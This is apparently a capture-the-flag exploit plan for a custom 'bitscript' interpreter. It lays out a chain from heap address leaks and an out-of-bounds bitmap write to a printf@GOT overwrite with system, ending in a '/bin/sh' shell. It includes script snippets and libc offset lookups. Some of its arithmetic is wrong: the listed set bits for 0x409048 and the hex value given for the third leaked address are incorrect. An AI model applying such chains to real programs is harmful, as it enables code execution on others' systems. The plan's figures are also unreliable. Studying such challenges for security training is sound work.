# Full RCE Exploit Chain Strategy

## Leaked Heap Addresses

From your test:
- `addr1 = 160550944` (0x9920C20) - string "first"
- `addr2 = 160551248` (0x9920D50) - string "second"  
- `addr3 = 160551552` (0x9920E40) - string "third"

**Spacing:** ~304 bytes between each string structure

## Step-by-Step Exploit Chain

### Step 1: Understand Heap Layout

**String Structure (16 bytes):**
```
Offset 0x00: length (8 bytes)
Offset 0x08: data pointer (8 bytes)
```

**Variable Entry (64 bytes = 0x40):**
```
Offset 0x00-0x1F: name[32]
Offset 0x20: type (4 bytes)
Offset 0x24: padding (4 bytes)
Offset 0x28: value_ptr (8 bytes) ← TARGET!
Offset 0x30: prev (8 bytes)
Offset 0x38: next (8 bytes)
```

**Relationship:**
- Variable entry's `value_ptr` points to string structure
- Variable entry is allocated before string
- Typical malloc: variable entry ≈ `string_addr - 0x100` to `string_addr - 0x1000`

### Step 2: Find Variable Entry Address

**From leaked address `addr1 = 0x9920C20`:**

Variable entry for `leak1` is likely at:
- `0x9920C20 - 0x100` = `0x9920B20`
- `0x9920C20 - 0x200` = `0x9920A20`
- `0x9920C20 - 0x300` = `0x9920920`

**We need to find the exact address. Options:**

**Option A: Use OOB Read**
```bitscript
bitmap b1 = create(9223372036854775807, 2);
// Read from calculated addresses
// Look for "leak1" string at offset 0x00
```

**Option B: Calculate from Allocation Order**
- Variables allocated before strings
- If we know allocation order, can estimate

**Option C: Use Multiple Leaks**
- Compare spacing between variables
- Calculate relative positions

### Step 3: Create Target Variable

```bitscript
int target = 0;
string target = "target";
int targetaddr = target;  // Leak target's string address
```

**Now we have:**
- `targetaddr` = address of "target" string structure
- Variable entry for `target` ≈ `targetaddr - offset`

### Step 4: Calculate Bitmap Write Coordinates

**Goal:** Write `printf@GOT` address (0x409048) to `target` variable's `value_ptr` (offset 0x28)

**Formula:**
```
target_addr = target_entry_addr + 0x28
bitmap_data_ptr + (y * INT64_MAX + x) / 8 = target_addr

y = ((target_addr - bitmap_data_ptr) * 8) / INT64_MAX
x = ((target_addr - bitmap_data_ptr) * 8) % 8
```

**We need:**
1. `target_entry_addr` - from Step 2
2. `bitmap_data_ptr` - bitmap buffer address

### Step 5: Find Bitmap Data Buffer Address

**Bitmap is created after variables:**
- `bitmap_data_ptr` ≈ `last_string_addr + offset`
- Or use OOB read to find it
- Or calculate from allocation order

### Step 6: Write printf@GOT Address Bit-by-Bit

**Target:** `0x409048` (printf@GOT address)

**In binary (64-bit, little-endian):**
```
0x0000000000409048 = 
0b0000000000000000000000000000000000000000010000001001000001001000
```

**Set bits at positions:**
- Bit 3: 1
- Bit 9: 1  
- Bit 10: 1
- Bit 15: 1
- Bit 22: 1
- Bit 26: 1

**Write each bit:**
```bitscript
// For each set bit position:
set(b1, x + bit_pos, y, 1);
```

### Step 7: Read libc Address

```bitscript
int libc_leak = target;  // Reads from printf@GOT
print(libc_leak);        // Prints libc's printf address
```

### Step 8: Calculate system Address

**Need libc offsets:**
```bash
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " printf"
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " system"
```

**Calculate:**
```
libc_base = leaked_printf - printf_offset
system_addr = libc_base + system_offset
```

### Step 9: Write system to printf@GOT

**Target:** `0x409048` (printf@GOT)

**Write `system_addr` bit-by-bit using bitmap overflow**

### Step 10: Trigger RCE

```bitscript
print("/bin/sh");  // Calls printf, but printf@GOT → system
                   // → system("/bin/sh") → shell!
```

## Practical Implementation Challenges

### Challenge 1: Finding Exact Addresses

**Solution:** Use OOB read to scan heap:
```bitscript
bitmap b1 = create(9223372036854775807, 2);
// Scan from leaked addresses backwards
// Look for variable name patterns
```

### Challenge 2: Bit-by-Bit Write

**Problem:** Bitscript has no bitwise operations

**Solution:** Pre-calculate all bit positions:
- For `0x409048`: bits 3, 9, 10, 15, 22, 26 are set
- Write each manually

### Challenge 3: Alignment

**Solution:** Calculate `x` and `y` carefully to align with byte boundaries

## Simplified Approach

Given the complexity, here's a **practical path**:

1. **Use leaked addresses** to estimate variable entry locations
2. **Use OOB read** to find exact addresses by scanning for variable names
3. **Use bitmap overflow** to write to calculated addresses
4. **Corrupt value_ptr** to point to GOT
5. **Leak libc** and achieve RCE

## Alternative: Direct GOT Write

If we can calculate addresses precisely, we could:
1. Skip variable corruption
2. Write directly to `printf@GOT` (0x409048) using bitmap overflow
3. But this requires knowing `bitmap_data_ptr` exactly

## Next Steps

1. Create OOB read script to find variable entry addresses
2. Calculate bitmap buffer address
3. Write exploit script with calculated coordinates
4. Test and refine

The leaked addresses are **critical** - they give us the reference points we need!

